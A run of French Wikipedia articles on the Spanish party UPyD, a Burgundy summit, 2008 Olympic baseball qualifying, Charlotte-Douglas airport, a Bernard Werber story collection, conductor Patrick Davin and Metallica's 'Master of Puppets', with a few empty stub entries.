Des membres célèbres du "Foro de Ermua" ont manifesté leur soutien au parti, y compris l'ex-président Vidal de Nicolás, le syndicaliste Tomás Tueros, le sculpteur Agustín Ibarrola, Rubén Múgica (porte-parole du "Foro de Ermua" et fils de Fernando Múgica, assassiné par l'ETA) et Mikel Buesa (lequel abandonnerait le parti en 2009).
Depuis le monde de la politique, l'UPyD a été soutenu par l'ex-député du PSOE Carlos Zayas, l'ex-consul général de l'Espagne à Genève et ex-ambassadeur en Finlande Antonio García Abad, et l'ex-responsable des minorités ethniques de l'Institut de la Femme de Madrid Pilar Heredia (même si celle-ci a rejoint les abandons qui ont suivi le Congrès de 2009) et l'ex-secrétaire général de CCOO José María Fidalgo. Le leader d'extrême droite Ricardo Sáenz de Ynestrillas a aussi montré son soutien à l'UPyD, puisque selon lui, l'UPyD serait le parti le plus semblable au 
Début , le parti a annoncé l'adhésion de l'ex-maire d'Alcobendas José Caballero, après dans le poste pour le PSOE.
D'autres personnalités qui ont montré leur soutien sont, par exemple, le professeur de Science politique à l'Université Complutense de Madrid Antonio Elorza, le professeur de Philosophie Politique et Moral à l'Université du Pays basque Aurelio Arteta (celui-ci comme candidat par la Navarre au Congrès des Députés dans les législatives de 2008), le professeur de Droit Administratif à l'Université de León Francisco Sosa Wagner (élu eurodéputé aux européennes de 2009), l'écrivain péruvien Fernando Iwasaki, l'écrivain et académique Álvaro Pombo (tête de liste au Sénat en 2008), les acteurs Toni Cantó (élu député aux législatives de 2011), Miguel Hermoso, Ignasi Vidal, le peindre Rafael Canogar (qui a donné une de ses œuvres pour le financement de la campagne des européennes de 2009) et la journaliste Irene Lozano (élue députée aux législatives de 2011). Également les écrivains Rosa Montero et Fernando Sánchez Dragó ont montré leur soutien à Rosa Díez. L'hymne du parti est une œuvre du compositeur Sabino Méndez, ex-membre de "Loquillo y Trogloditas".
Des sources de l'UPyD ont annoncé le soutien de l'écrivain et académique Antonio Muñoz Molina, qui a démenti cette affirmation.
Le journaliste et humoriste Javier Capitán a participé dans l'acte d'inauguration de la campagne électorale pour les législatives de 2011, au même temps que le Prix Planeta Javier Moro a manifesté son intention de voter pour l'UPyD dans les dites élections.
Pour ces mêmes élections, le Prix Nobel de Littérature Mario Vargas Llosa, a écrit un article d'opinion dans le journal "El País" annonçant son intention de voter pour l'UPyD. Das cet article il a demandé le vote pour la formation politique, tout en qualifiant Rosa Díez de .
Des semaines après la convocation anticipée d'élections régionales au Pays basque en 2012, Consuelo Ordóñez, la sœur de l'assassiné par l'ETA Gregorio Ordóñez, est intervenu dans l'acte de présentation des candidats de l'UPyD et a demandé le vote pour la candidature présentée par Gorka Maneiro à la "Lehendakaritza" pour que.
Controverse.
Depuis sa fondation, le parti a suscité des controverses et des critiques.
Le politologue Ignacio Sánchez-Cuenca, professeur de Sociologie à l'Université Complutense de Madrid, a affirmé que l'UPyD veut combattre «les nationalismes basque et catalan non avec des arguments, mais avec une bonne dose de nationalisme espagnol», il lui a reproché son idéologie « centraliste » ou qu'ils veulent supprimer la présence des partis nationalistes périphériques au Congrès des Députés, ce qui, d'après lui, signifierait «sacrifier les éléments les plus essentiels de notre démocratie ». Sánchez-Cuenca conclut: « au parti de Díez et Savater, leur marchandise idéologique semble clairement abîmée ». Ces critiques ont été refusées par Carlos Martínez Gorriarán, qui les a attribuées à la «tergiversation» et à «la attribution (à l'UPyD) très facile de ce qui il aimerait que notre parti disait, et pas ce que l'on dit vraiment».
Le journaliste Javier Ortiz, décédé en 2009, cofondateur du journal "El Mundo, "tête de la page d'opinion entre 1992 et 2000, organisateur de "El Mundo del País Vasco" et, jusqu'à son décès, chroniqueur du journal "Público", s'est auto-défini comme fédéraliste et a affirmé que l'UPyD était une initiative «nationaliste espagnole». Depuis, le Parti Populaire, Ignacio González, même en admettant son soutien en matière de politique anti-terroriste et d'intégrité territoriale, a placé l'UPyD dans l'extrême gauche dans toutes les autres matières, en même temps que Gotzone Mora, qui après avoir été sur les listes du PSE-EE a demandé de voter pour le Parti Populaire, a affirmé que « les postulats de l'UPyD sont déjà défendus par le PP » et a accusé l'UPyD de servir aux intérêts du PSOE.
L'UPyD a été aussi qualifié comme populiste à cause du discours, des actes et du rôle personnel de leur leader, ce qui a été contesté par le parti.
D'autre part, l'UPyD a trouvé des sympathisants dans les extrêmes du spectre politique, comme la "Falange Auténtica" ou la "Unificación Comunista de España".
La Fédération nationale des lesbiennes, gays, transsexuels et bisexuels a expulsé l'UPyD de la Gay Pride en 2009, car le parti n'avait pas voté pour une résolution pour que la Lituanie réforme la loi qui criminalise l'homosexualité et la bisexualité. Le parti a riposté que leur parlementaire s'était trompé de bouton lors du votate, et tout de suite, a initié les procédures nécessaires pour manifester son soutien à la résolution. L'association du collectif homosexuel COLEGAS s'est montrée contre cette expulsion puisqu'elle considérait la décision comme propre des « inquisiteurs roses ». En tout cas, l'UPyD a pris position en faveur du mariage entre personnes de même sexe et de la loi en vigueur en Espagne, et a participé aux célébrations du Gay Pride dans les villes espagnoles, y compris, à Madrid, où même Rosa Díez a participé. Il a aussi demandé au PP de retirer le recours présenté auprès du Tribunal Constitutionnel pour l'abrogation de la loi autorisant le mariage homosexuel.
Organisation.
Le parti est organisé autour de quatre organes de gouvernement et des commissions auxiliaires.
Congrès.
C'est l'organe souverain du parti, il est convoqué avec une périodicité ordinaire de trois à quatre ans, ou de façon extraordinaire par accord du Conseil de direction. Tous les militants de l'UPyD peuvent formuler des amendements et postuler comme délégués sans besoin d'un aval. Les membres du Conseil de direction sont délégués de plein droit, les autres, jusqu'à un maximum de cinq cents, sont élus grâce à des élections internes ; le nombre de délégués correspondant à chaque circonscription est désigné en fonction du nombre de militants qu'elle a. Le congrès définit les objectifs du parti, approuve les modifications statutaires, évalue la gestion des organes directifs du parti et élit les nouveaux membres des différents organes, sauf le Conseil de direction qui est élu par tous les militants.
Conseil de Direction.
C'est le plus haut organe de direction politique du parti entre les congrès. Il est formé par le porte-parole et vingt autres membres, élus par tous les militants grâce à des candidatures complètes et fermées. Tous les militants peuvent y postuler sans besoin des avals ni des quotes-parts territoriales. La porte-parole du parti est Rosa Díez.
Conseil politique.
C'est un organe de délibération politique chargé du contrôle du reste d'organes du parti, et aussi de ses représentants publics. Il est conformé par , dont 110 élus par les délégués au Congrès, les du Conseil de direction et les 19 coordinateurs territoriales. Tout militant peut y postuler sans besoin d'avals ni de quotes-parts territoriales. Tout militant peut proposer au Conseil Politique de débattre de questions concernant la politique générale, l'intérêt général et l'actualité sur desquelles le parti ne s'est pas prononcé auparavant.
Regroupements territoriaux.
Il y a un regroupement territorial dans chaque communauté autonome et dans chacune des villes autonomes (Ceuta et Melilla).
Organes de contrôle et garanties.
Bureau de contrôle des bonnes pratiques.
C'est un organe auxiliaire du Conseil politique. Il est composé par cinq membres du Conseil politique, et il est chargé du contrôle de l'activité des représentants publics et organiques du parti, la vérification du respect du Code des bonnes pratiques publiques du parti.
Commission des garanties.
Elle est chargée de garantir les droits des militants et la résolution des recours disciplinaires. Elle est composée par trois membres, élus par les délégués du Congrès du parti. Tout militant ayant plus de deux ans de militance peut se porter candidat à un poste. Les membres de la Commission des garanties ne peuvent pas être membre de tout autre organe du parti.
Commission des finances.
Elle est chargée de superviser la gestion économique du parti, la comptabilité et l'administration des moyens matériels du parti. Elle est composée par trois membres élus de la même façon que ceux de la commission de garanties. Les membres de la Commission de Finances ne peuvent pas être part de n'importe quel autre organe du parti.
Commission électorale.
Elle est chargée du contrôle du développement des processus électoraux internes. Elle est formée par sept membres, dont trois élus par le Conseil de Direction et quatre élus par les délégués du Congrès du parti.
Fondation progrès et démocratie.
Le , le parti a annoncé la création de la Fondation progrès et démocratie, dont la direction est formée par les membres du conseil de direction du parti, et présidée par Rosa Díez. Elle a pour but de soutenir l'activité du parti, promouvoir le débat politique, former des personnes dans ce domaine, susciter l'élaboration de projets et impulser la recherche dans des divers champs. Ses études et publications se sont concentrés sur la régénération démocratique espagnole, le développement de la démocratie dans l'Amérique Latine, la résolution de conflits où l'Espagne a quelque chose à apporter (Cuba, le Sahara occidental) et la recherche de l'efficience administrative de la nation à tous les niveaux.
Financement.
L'UPyD veut se financier majoritairement avec les contributions de ses membres. Le reste de son financement provient de donations, subventions institutionnelles et de prêts bancaires.
Le , l'UPyD a donné une conférence de presse où elle a affirmé être victime d'un traitement d'« inégalité évidente » de la part de la banque espagnole, qu'ils ont accusée de leur refuser les crédits demandés, alors qu'elle faisait d'importantes remises de dette aux autres partis. Dans ce contexte, le parti a expliqué que jusqu'à ce moment-là l'UPyD finançait ses activités grâce aux contributions des militants et de petites donations, mais a reconnu que le parti « ne pouvait pas continuer comme ça » et faire face à la campagne électorale avec des tels moyens.
Résultats électoraux.
Élections européennes.
En 2015, deux des quatre députés européens (Fernando Maura Barandiarán et Enrique Calvet Chambon) sont exclus du parti. Fernando Maura est remplacé par Teresa Giménez Barbat en novembre 2015 mais celle-ci quitte UPyD pour rejoindre Ciudadanos deux semaines après son entrée au Parlement européen. En , une troisième élue du parti, Beatriz Becerra Basterrechea, quitte le parti. Depuis, UPyD ne compte plus qu'une députée européenne : Maite Pagazaurtundua.

</doc>
<doc id="3215670" url="https://fr.wikipedia.org/wiki?curid=3215670" title="Signal de la Mère Boitier">
Signal de la Mère Boitier

Le signal de la Mère Boitier est un sommet situé sur la commune de Tramayes en Saône-et-Loire, dans la région Bourgogne-Franche-Comté du sud. Du haut de ses 758 mètres, il est l'un des points culminants des monts du Mâconnais, avec le mont Saint-Cyr dont le sommet se situe à Montmelard, sur la bordure orientale du Massif central.
Il s'appelait autrefois la "mure Boitier", le toponyme "mure" pouvant désigner un site anciennement peuplé. Une légende dit aussi que le nom donné à ce sommet viendrait du nom d'une aubergiste locale assassinée à une époque où l'on voyageait encore en diligences.
Depuis la table d'orientation, qu'on atteint par un sentier assez raide, on découvre un panorama étendu sur la Bresse, le Beaujolais et les monts du Mâconnais, avec leurs talus abrupts tournés vers l'ouest et leurs flancs en pente douce orientés à l'est. Sous le sommet se situe une aire de pique-nique et le sentier des « dessous de la mère boitier », long de .
Ce sommet surplombe la région sur un rayon minimum de 6 kilomètres, distance à laquelle on rencontre un sommet plus élevé (759 m) appartenant aux monts du Beaujolais (commune de Saint-Jacques-des-Arrêts).
Il a donné son nom à la communauté de communes Saint-Cyr Mère Boitier entre Charolais et Mâconnais.

</doc>
<doc id="3215672" url="https://fr.wikipedia.org/wiki?curid=3215672" title="Baseball aux Jeux olympiques d'été de 2008 - Qualifications">
Baseball aux Jeux olympiques d'été de 2008 - Qualifications

Huit équipes nationales se sont qualifiées pour le tournoi de baseball aux Jeux olympiques d'été de 2008. En plus de la Chine, qualifiée comme pays organisateur, deux équipes américaines, une équipe asiatique et une équipe européenne se sont qualifiées lors des tournois continentaux. Les trois dernières équipes se sont qualifiées lors du tournoi de qualification olympique.
Équipes qualifiées.
Chinese Taipei est le nom anglais officiel donné par le Comité international olympique pour l'équipe qui représente Taïwan.
Qualifications.
Tournoi de qualification des Amériques.
Sans grande surprise, le tournoi de qualification des Amériques a vu se qualifier les deux équipes qui gagnent habituellement les coupes du monde : les États-Unis et Cuba.
Le tournoi, qui s'est joué à La Havane, s'est déroulé en deux phases : les douze équipes étaient réparties en deux groupes de six et affrontaient chaque équipe de leur groupe du 25 au 30 août.
Les quatre meilleures équipes de chaque groupe étaient qualifiées pour le second tour, où elles conservaient les résultats acquis face aux équipes encore en lice.
Elles affrontaient du 1 au 5 septembre les quatre équipes de l'autre groupe.
Cuba a perdu face aux États-Unis 5-8 dans le dernier match, alors que les États-Unis avaient perdu face au Venezuela au premier tour 9-12. Ces équipes ont gagné tous leurs autres matchs, et ont fini aux première et deuxième places du tournoi, qualificatives pour les Jeux olympiques de Pékin.
En plus des deux équipes qualifiées directement pour les JO, le Mexique et le Canada participeront au tournoi de qualification olympique qui désignera trois qualifiés parmi huit équipes. Le Mexique, le Canada, le Venezuela et le Panama se sont qualifiés pour la trente-septième coupe du monde de baseball à Taipei en 2007.
Championnat d'Europe de baseball.
Le Championnat d'Europe de baseball a eu lieu du 7 au 16 septembre 2007. Les Pays-Bas, champion d'Europe sont qualifiés directement. L'Espagne et l'Allemagne participeront au tournoi de qualification olympique.
Championnat d'Asie de baseball.
Le championnat d'Asie de baseball a eu lieu du 27 novembre au 3 décembre 2007. Le Japon, champion d'Asie est qualifié directement. La Corée du Sud et Taïwan, respectivement deuxième et troisième, participeront au tournoi de qualification olympique.
Tournoi de qualification africain.
Le tournoi de qualification africain a eu lieu du 15 au 17 décembre 2007 à Johannesburg (Afrique du Sud). L'équipe d'Afrique du Sud s'est qualifiée pour le tournoi de qualification olympique.
Classement.
J : rencontres jouées, V : victoires, D : défaites, PM : points marqués, PC : points concédés, % : pourcentage de victoire.
Championnat d'Océanie de baseball.
À la suite du retrait de l'équipe de Nouvelle-Zélande de la finale du championnat d'Océanie, l'Australie a été désignée comme représentant de la confédération pour le tournoi de qualification olympique.
Tournoi de qualification olympique.
Le tournoi de qualification olympique a eu lieu du 7 au 14 mars 2008. Les deux équipes européennes (Espagne et Allemagne) et les deux équipes asiatiques (Taïwan et Corée du Sud) se sont disputé les trois dernières places qualificatives avec le Mexique, le Canada, l'Afrique du Sud et l'Australie.
Classement.
L'équipe du Canada prend la première place grâce à sa victoire 4 à 3 sur l'équipe de Corée du Sud. L'équipe du Mexique prend la quatrième place grâce à sa victoire 7 à 4 sur l'équipe d'Australie.
J : rencontres jouées, V : victoires, D : défaites, PM : points marqués, PC : points concédés, % : pourcentage de victoire.
À l'issue d'une semaine de tournoi, le Canada, la Corée du Sud et Taïwan se sont qualifiés pour le tournoi des Jeux Olympiques.

</doc>
<doc id="3215673" url="https://fr.wikipedia.org/wiki?curid=3215673" title="Edmontosaure">
Edmontosaure



</doc>
<doc id="3215674" url="https://fr.wikipedia.org/wiki?curid=3215674" title="École de la Salpêtrière">
École de la Salpêtrière

L'école de la Salpêtrière peut être :

</doc>
<doc id="3215678" url="https://fr.wikipedia.org/wiki?curid=3215678" title="Aéroport international Charlotte-Douglas">
Aéroport international Charlotte-Douglas

L'aéroport international de Charlotte-Douglas est un aéroport qui dessert la ville de Charlotte en Caroline du Nord aux États-Unis.
C'est le premier aéroport de cet État et le au monde pour le trafic passagers (classement 2015).
L'aéroport constituait la troisième plate-forme de correspondance ("hub") d'US Airways avant la fusion de celle-ci avec American Airlines en 2013. Aujourd'hui, CLT est un des hubs de la compagnie américaine.
Histoire.
Il a été créé en 1935 sous le nom de "Charlotte Municipal Airport" puis renommé en 1954 en "Douglas Municipal Airport". Il a pris son nom actuel en 1982.
Compagnies et destinations.
Il dessert la plupart des villes américaines, en tant que « hub » intérieur, mais aussi plusieurs destinations internationales comme Paris (aéroport de Roissy-Charles de Gaulle) avec la compagnie American Airlines et Londres.
Projets.
Construction d'une quatrième piste.
La planification est en cours pour la construction d'une quatrième piste parallèle entre les pistes existantes 18R / 36L et 18C / 36C. La piste, qui devrait coûter 422 millions de dollars, devrait mesurer 10 000 pieds de long.  Auparavant, une piste de 12 000 pieds avait été prévue; cependant, l'aéroport a inversé le cap en raison de considérations pratiques et financières. 
Agrandissements de terminaux existants.
Les futurs agrandissements de terminaux inclus dans le cadre de Destination CLT comprennent la phase II de l'agrandissement du hall A, la phase VIII de l'agrandissement du hall E et les agrandissements des halls B et C. Ces agrandissements devraient coûter environ 1,1 milliard de dollars et ne devraient pas être terminés. jusqu'en 2026. 8 à 10 portes devraient être ajoutées au hall B, 10 à 12 portes au hall C et 10 portes dans l'agrandissement du hall A plus au nord. La phase VIII de l'agrandissement du hall E ajoutera 34 000 pieds carrés de salle d'attente au hall. Cette phase de l'expansion accueille des portes déjà en fonctionnement; cependant, les passagers doivent marcher sous des auvents temporaires pour accéder à l'avion stationné à ces portes. 
Construction d'un train léger sur rail.
La construction de la CATS LYNX Silver Line , qui devrait être achevée en 2030, apportera un service de train léger sur rail à l'aéroport. L'aéroport prévoit de construire un déménageur automatisé pour connecter le terminal à la station de train léger sur rail, qui sera situé dans le district de destination de l'aéroport, juste au nord du terminal. 

</doc>
<doc id="3215708" url="https://fr.wikipedia.org/wiki?curid=3215708" title="Pas de l'hélice">
Pas de l'hélice



</doc>
<doc id="3215713" url="https://fr.wikipedia.org/wiki?curid=3215713" title="Anticonstitutionnellemment">
Anticonstitutionnellemment



</doc>
<doc id="3215723" url="https://fr.wikipedia.org/wiki?curid=3215723" title="Paradis sur mesure">
Paradis sur mesure

Paradis sur mesure est un recueil de dix-sept nouvelles de l'auteur Bernard Werber, publié le . Ces nouvelles décrivent des moments passés et des futurs possibles. Les « passés » correspondent à des épisodes autobiographiques, tandis que les « futurs » montrent souvent une humanité en difficulté. La dernière phrase du roman et de la est : « retrouvons nous bientôt ».
Nouvelles.
"Et l'on pendra tous les pollueurs".
Cette nouvelle dépeint un futur possible durant lequel la pollution est devenue un crime puni de mort, à la suite de la détérioration rapide de la couche d'ozone. Après de nombreux conflits, le monde est devenu un lieu où tout a été fait pour conserver les apparences de l'urbanisme contemporain mais avec des moyens écologiques.
Le narrateur et personnage principal, Jérôme Toledano, est un ancien membre de la Police Anti-Pollution démis de ses fonctions pour ses manières brutales. Il officie désormais comme inspecteur auprès des affaires de soupçon de pollution. Cependant, il est piégé par sa maîtresse : il accepte d'être initié au plaisir de manger de la viande rouge, de fumer un cigare et de rouler sur une moto, et y prend goût. Il est alors arrêté, pendu pour trahison et pollution. Il regrette son erreur et dit en guise de conclusion : 
"Intermède : la vérité est dans le doigt".
Cette nouvelle, comme son titre l'indique, n'en est pas vraiment une et a valeur de court intermède. Page 49.
"Question de respect".
Présentée sous forme de monologue, cette nouvelle raconte la soirée d'un agent de sécurité particulier qui a vu la vie nocturne d'un présentateur télé, où, dans la même nuit, il a frappé deux prostituées, battu un grand trafiquant de drogues avec une tringle à rideaux et provoqué l'incendie d'une boîte de nuit non sans avoir insulté le personnel.
Le narrateur conclut en se demandant si le respect dont il a fait montre durant cette nuit était réciproque.
"Le sexe des fleurs".
Futur possible, imaginant l'humanité devenue stérile. L'humanité s'en trouve désemparée jusqu'au jour où on découvre que certains hommes et femmes ont muté et développé un appareil reproducteur semblable à celui des fleurs. Le monde évolue donc pour permettre la pérennité de l'espèce, devenant ainsi de plus en plus végétal.
"Civilisation disparue".
Un groupe d'archéologues part à la recherche d'une civilisation disparue. seul un, l'initiateur de l'expédition, parvient au bout de ses recherches et découvre les derniers vestiges d'un peuple civilisé et développé mais qui s'est auto-détruit à cause de son égoïsme. Le lecteur découvre à la fin que l'explorateur est une fourmi, et la civilisation, les hommes.
"Meurtre dans la brume".
C'est l'histoire d'un jeune homme qui est envoyé dans un petit village de province pour travailler en tant que journaliste. Lors d'une enquête sur la découverte d'un jeune enfant décédé retrouvé dans le fleuve, il mène une enquête pour son journal. Il apprend très vite que c'est probablement la mère du petit qui l'a tué pour faute d'argent. Elle a préféré garder le plus beau des deux enfants et sacrifier l'autre pour l'argent. Son chef de rédaction, après avoir lu son article, lui dit qu'il ne doit pas le publier, car il aurait alors sur la conscience la mort de plusieurs enfants qui comme ce petit garçon pourraient mourir noyés dans un sac. Son article donnerait à toutes les autres mères se trouvant dans la même situation une nouvelle manière de se débarrasser de leurs enfants devenus trop encombrants.
Il finira par partir pour travailler ailleurs car cette histoire le hante. Un peu plus tard éclate l'affaire Grégory. Il se dira alors : « Celui qui a publié cela a-t-il pensé aux conséquences de son acte ? »
"Demain les femmes".
Madeleine Wallenberg, une scientifique généticienne rêve constamment d'un monde peuplé uniquement de femmes. Ce rêve altérera son travail de biologiste, qui étudie les capacités d'évolution des espèces aux radiations nucléaires.
En s'inspirant des études de sa mère, elle parvient à faire évoluer une espèce de souris résistantes grâce à un mode de reproduction ovipare. Elle devient alors la cible du gouvernement pakistanais, dirigé par un ancien militaire condamné par un cancer qui veut condamner l'humanité, parce qu'officieusement, Madeleine a déjà créé un premier œuf humain.
La nouvelle se conclut alors que le monde se détruit et que le premier œuf viable éclot.
"Paradis sur mesure".
Sous forme épistolaire, l'auteur décrit son destin : enlevé à la nature, il est devenu une star du Music-hall en se produisant avec un homme qu'il prend pour son imprésario. Alors qu'il vieillit et que son imprésario sombre dans l'alcool, il est envoyé dans une boucherie : l'auteur est en réalité un lapin et son imprésario un prestidigitateur.
"Le Maître de cinéma".
Après la troisième guerre mondiale, les chefs d'État décident qu'il faut « oublier » pour ne pas récidiver. Plusieurs interdictions s'ensuivent, dont l'interdiction de l'instruction de l'Histoire. Leurs décisions entrainant l'ennui du peuple, le cinéma devient alors l'occupation principale des humains, et rapidement, seul un réalisateur, David Kubrick, parvient à imposer ses films.
Plusieurs années plus tard, alors que les rumeurs de la mort de Kubrick s'intensifient, une journaliste infiltre les studios, étrangement déserts, pour retrouver le Maître de Cinéma et apprendre son secret : il a utilisé le Grand collisionneur de hadrons pour remonter le temps et filmer de vraies personnes avant l'Apocalypse. Mourant, la journaliste accepte de prendre sa relève, mais elle finit par mourir elle aussi, la vérité est révélée et les films du Maître interdits, mais ils sont encore en circulation sous le manteau.
"Le Moineau destructeur".
Le narrateur de la nouvelle rencontre une jeune femme pessimiste avec qui il vivra une liaison compliquée. Il essaiera de l'aider, même après qu'elle le quitte pour un brillant psychiatre, spécialiste de l'amour et de la psychologie féminine. Quand ils découvrent que le psychiatre est un fou destructeur et jaloux à l'extrême qui soumet ses compagnes avec des drogues et des mauvais traitements, et ce en toute impunité car protégé par ses relations politiques, le narrateur vient au secours de la jeune femme, qui finit par retourner deux fois chez le psychiatre.
Leur dernière rencontre se passe alors que le psychiatre s'apprête à violenter et séquestrer à nouveau la jeune femme dans son appartement. Il faudra l'intervention de trois agents de police pour que le couple puisse fuir, mais le narrateur décide de couper toute relation avec elle, ne pouvant plus en supporter davantage. La jeune femme retourne dans sa Normandie natale, tandis que le psychiatre parvient à conserver son image publique intacte.
"Là où naissent les blagues".
Un comique en pleine gloire décide de tout cesser afin de trouver l'origine des blagues. Ils remontent le fil jusqu'à découvrir une société secrète, la Grande Loge de l'Humour, terrée sous un phare au large de Carnac. Il suit ainsi la formation de ceux qui créent les boutades, découvrant l'histoire de l'humour et la biologie du rire, parvenant à devenir membre de la GLH.
Pour son avenir, il s'interroge sur la Blague Ultime, celle qui serait capable de faire mourir n'importe qui de rire.
"Les Dents de la Terre".
Un étudiant en journalisme remporte un concours pour la promotion d'un reportage original. Il peut ainsi partir réaliser son objectif : un reportage photo sur les fourmis magnans, au cours duquel il découvre la culture du village africain et manque de perdre la vie dévoré par les insectes pour prendre une image de la reine de la colonie.
"Ça va vous plaire".
Un scénariste soumet le projet d'une nouvelle série télévisée quand le directeur des programmes lui montre que son projet est trop original pour fonctionner. Le jeune auteur commence à ouvrir les yeux sur le conformisme du monde dans lequel il vit et essaie de provoquer une réaction des gens, sans succès. Il retourne alors chez le directeur des programmes, qu'il accuse d'être en partie responsable de l'apathie des masses et menace de le tuer selon un tirage de pile ou face.
Finalement, il l'épargne et lui fait produire une série sur son aventure, qui connait un succès retentissant, mais le directeur de chaîne en fait dès lors le nouveau modèle à suivre.
"La Guerre des marques".
Un récit d'anticipation où les entreprises commerciales prennent le pas sur le pouvoir politique, prenant le contrôle du monde et changeant les nations en territoires de préférence à une marque.
Celles qui sont devenues suffisamment puissantes se lancent dans la conquête spatiale, délaissant la Terre désormais inhabitable et inexploitable, mais où certaines personnes âgées retrouvent le savoir-faire de la manufacture.
"La Stratégie de l'épouvantail".
Le narrateur, anonyme, se rend à la réunion du syndic de son immeuble et participe à des votes à mains levées sur différents points, à commencer par l'installation d'un centre pour enfants trisomiques au rez-de-chaussée. Il se dégage rapidement un groupe de six personnes mal aimables que tous les résidents prennent en grippe.
Le narrateur découvre peu après que le syndic et les six sont de connivence, en ayant manipulé tous les résidents pour atteindre leurs véritables objectifs : le financement des travaux par un parent du directeur du syndic et l'augmentation du salaire de ce dernier.
"Anti-proverbe".
Un ancien professeur de philosophie et un enfant s'affairent à démontrer que les proverbes français sont faux, avant de conclure qu'ils ne sont plus adaptés à la société actuelle.
"Un amour en Atlantide".
Le narrateur revit par la méditation une de ses vies antérieures, celle où il a rencontré son grand amour. Il découvre ainsi la vie d'un homme, qu'il identifie comme un Atlante, qui a vécu une passion forte avec une jeune femme. En sortant de son expérience, le narrateur reste songeur et espère retrouver son âme sœur de nos jours.

</doc>
<doc id="3215731" url="https://fr.wikipedia.org/wiki?curid=3215731" title="Patrick Davin">
Patrick Davin

Patrick Davin, né le à Huy et mort le à Bruxelles, est un chef d'orchestre belge.
Biographie.
Patrick Davin naît le à Huy (Belgique).
Il fait des études de piano et de violon à l'académie de Huy, puis au Conservatoire royal de Liège, où il suit une formation complète (solfège, histoire de la musique, analyse musicale, diplôme supérieur de violon, harmonie, contrepoint et fugue). Il obtient un Premier Prix de direction d'orchestre dans la classe de Roger Rossel et continue sa formation au conservatoire de Toulon, où il obtient la Médaille d'or de direction et le Prix de Perfectionnement (spécialité direction lyrique). Entre-temps, il est assistant dans la classe de violon du conservatoire liégeois, et enseigne l'analyse musicale. Il est également l'élève de René Defossez, Pierre Boulez et de Peter Eötvös.
En 1992, Patrick Davin est finaliste du Concours international de jeunes chefs d'orchestre de Besançon. Il commence dès lors à travailler comme assistant de plusieurs grands chefs d'orchestre tels Sylvain Cambreling, Günther Herbig ou Luciano Berio. 
Entre 1988 et 1999, il est professeur d'analyse musicale au Conservatoire royal de Liège. 
Très investi dans le domaine de la musique contemporaine, il dirige l'ensemble belge Musiques nouvelles, entre 1993 et 1999, puis l'ensemble L'Itinéraire à Paris à partir de 1999. 
Il dirige également à l'opéra, prend la direction artistique du Chœur de chambre de Namur et devient premier chef invité de l'Opéra de Marseille entre 2004 et 2007, et premier chef invité à l'Opéra royal de Wallonie à partir de 2005. 
En , Patrick Davin est nommé directeur musical et artistique de l'Orchestre symphonique de Mulhouse avec entrée en fonction à partir de la saison 2013-2014. Il reste à la tête de l'orchestre alsacien jusqu'en 2018. En , il est nommé directeur du domaine musique du Conservatoire royal de Liège. 
Il a assuré la création d'un nombre important d'œuvres de compositeurs contemporains tels que Jean-Louis Agobet, Philippe Boesmans ("Au monde", opéra, 2004), Jean-Yves Bosseur, Régis Campo ("Faërie", 2001), Édith Canat de Chizy ("L'Ibis rouge", 2014), Charles Chaynes ("Cecilia", opéra, 2000), Vinko Globokar, Michaël Lévinas, Bruno Mantovani, Benoît Mernier (La Dispute, opéra, 2013), Henri Pousseur et Marco Stroppa, notamment. 
En tant que chef d'orchestre, il a dirigé l'Ensemble Modern de Francfort, la "Deutsche Kammerphilharmonie" de Brême, les orchestres des radios de Stuttgart et de Munich, l'Orchestre de la Suisse romande, "Het Orkest van het Oosten" et le "Nieuw Sinfonietta" aux Pays-Bas, le "Jonde" et le "Teatro Real" en Espagne, le "Klangforum" de Vienne, l'Orchestre philharmonique du Luxembourg, l'Orchestre national des Pays de la Loire, l'Ensemble intercontemporain, l'orchestre national de Lille, l'Orchestre de Bretagne, celui de Rouen, celui de Marseille, les orchestres du Conservatoire national supérieur de musique et de danse de Paris, l'orchestre philharmonique de Nice, l'Orchestre national d'Île de France et l'Orchestre philharmonique de Radio France, l'orchestre philharmonique de Liège, l'orchestre national de Belgique et la "Philharmonie de Flandres".
À l'opéra, il dirige des productions mises en scène par Luc Bondy à La Monnaie, à l'Opéra National de Lyon et au Théâtre du Châtelet. Il a été premier chef invité à l'Opéra de Marseille et à l'Opéra royal de Wallonie, et a dirigé "La Damnation de Faust" de Berlioz à l'Opéra Bastille (juin 2006), "Arabella" de Richard Strauss à Opéra royal de Wallonie à Liège (), "Dialogues des carmélites" de Francis Poulenc à Marseille (), "Pelléas et Mélisande" de Claude Debussy à Opéra royal de Wallonie à Liège (), "Die Walkure" (La Walkyrie) de Richard Wagner à Marseille (), "Madame Butterfly" à Marseille (octobre-), "La Belle Hélène" de Jacques Offenbach à Toulouse (), "Don Giovanni" de Mozart à Monte-Carlo (), "Le Roi d'Ys" d'Édouard Lalo à Liège (mars-), "Louise" de Charpentier avec Mireille Delunsch dans le "rôle-titre" à l'Opéra Bastille ().
Patrick Davin meurt à Bruxelles le à l'âge de 58 ans, d'une crise cardiaque, alors qu'il devait diriger à La Monnaie une répétition de l'opéra "Is this the end ?" de Jean-Luc Fafchamps. Il est inhumé au cimetière d'Amay (Amay Nouveau).

</doc>
<doc id="3215737" url="https://fr.wikipedia.org/wiki?curid=3215737" title="Master of Puppets (chanson)">
Master of Puppets (chanson)

 est une chanson du groupe de thrash metal Metallica. Elle est la piste-titre de leur album "Master of Puppets".
Caractéristiques.
La chanson, comme James Hetfield l'expliqua, (traite pas mal des drogues. Comment les choses s'inversent, au lieu de contrôler les drogues que vous prenez, ce sont les drogues qui vous contrôlent) Les paroles "chop your breakfast on a mirror" par exemple font référence à l'acte de la préparation en poudre de la cocaïne.
"Master of Puppets" est également caractérisée par l'utilisation intensive du downpicking.
La chanson est la plus jouée du groupe en concert, ayant été jouée plus de 1600 fois depuis sa première interprétation le 31 Décembre 1985.
En 2022, la chanson est utilisée dans la saison 4 de la série télévisée "Stranger Things". Le personnage d'Eddie Munson joué par l'acteur britannique Joseph Quinn, l’interprète à la guitare dans l’épisode 9. Après la diffusion de l'épisode sur la plateforme Netflix le , "Master of Puppets" entre pour la première fois dans le classement des ventes de singles de plusieurs pays, avec notamment une place de numéro 1 dans le hit-parade rock et metal britannique.
Récompenses et classements.
La chanson fait partie du classement des 40 meilleures chansons de Metal selon VH1 (à la troisième place).

</doc>
<doc id="3215760" url="https://fr.wikipedia.org/wiki?curid=3215760" title="Nombre de capillarité">
Nombre de capillarité

